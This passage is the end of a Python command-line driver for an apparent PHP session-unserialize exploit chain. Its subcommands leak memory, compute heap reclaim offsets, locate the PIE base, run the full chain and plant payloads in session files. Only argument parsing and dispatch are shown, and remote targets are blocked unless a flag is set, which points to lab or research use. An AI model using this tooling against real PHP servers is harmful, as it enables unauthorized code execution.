                 "leak", "no-oracle", "calibrate", "poison", "probe"):
        subparser = sub.add_parser(name)
        if name == "no-oracle":
            subparser.add_argument(
                "--allow-local-fallback", action="store_true",
                help="allow /proc/<pid>/maps if the HTTP leak fails (lab only)")
            subparser.add_argument(
                "--candidates", action="append", default=None,
                metavar="D_OFF,K",
                help="override the (d_off,k) reclaim candidates, e.g. 0x81000,0xfe8")
        if name == "patchcheck":
            subparser.add_argument(
                "--version", default="8.4.26",
                help="vulnerable release to compare with its fixed counterpart")
        if name == "calibrate":
            subparser.add_argument(
                "--attempts", type=int, default=250,
                help="maximum (d_off,k) pairs tried while searching the "
                     "reclaim geometry")
            subparser.add_argument(
                "--proof-file", default="out/calib",
                help="remote proof file used to validate the PIE base")
            subparser.add_argument(
                "--no-update-profile", dest="update_profile",
                action="store_false",
                help="report the geometry without writing the profile")
        if name == "poison":
            subparser.add_argument("--sid", required=True,
                                   help="session id whose file is written")
            subparser.add_argument("--payload", required=True,
                                   help="bytes planted as the upload filename")
            subparser.add_argument("--progress-key", default=None,
                                   help="PHP_SESSION_UPLOAD_PROGRESS value")
    args = parser.parse_args()
    if not args.builder:
        args.builder = args.base
    if not remote_targets_allowed(args.base, args.builder, args.allow_remote):
        print(f"[!] {args.base} / {args.builder} is not loopback; "
              "use --allow-remote only with written authorization.", file=sys.stderr)
        return 4
    configure_paths(args)
    # PHP < 8.2 never frees the unserialize struct on the OOM bailout (no
    # php_session_cancel_decode), so there is nothing for these commands to
    # reclaim: use 'poison' against those builds.
    if args.cmd in ("leak", "primitive", "endgame", "chain", "calibrate",
                    "no-oracle") and not registry.chain_applies(args.version):
        print(f"[!] {args.cmd} needs a chain-verified branch (7.4, 8.0+): "
              f"older builds never reclaim the stale unserialize struct in "
              f"practice.")
        print("    Use 'poison' (session-file plant) against those builds.")
        return 1
    if getattr(args, "candidates", None):
        pairs = []
        for item in args.candidates:
            d_off, _, k = item.partition(",")
            pairs.append((int(d_off, 0), int(k, 0)))
        args.candidates = pairs
    dispatch = {
        "lifecycle": cmd_lifecycle,
        "oracle": cmd_oracle,
        "build-oom": cmd_build_oom,
        "build-ref": cmd_build_ref,
        "producer": cmd_producer,
        "reclaim-probe": cmd_reclaim_probe,
        "primitive": cmd_primitive,
        "endgame": cmd_endgame,
        "chain": cmd_chain,
        "patchcheck": cmd_patchcheck,
        "leak": cmd_leak,
        "no-oracle": cmd_no_oracle,
        "calibrate": cmd_calibrate,
        "poison": cmd_poison,
        "probe": cmd_probe,
    }
    return dispatch[args.cmd](args)


if __name__ == "__main__":
    sys.exit(main())
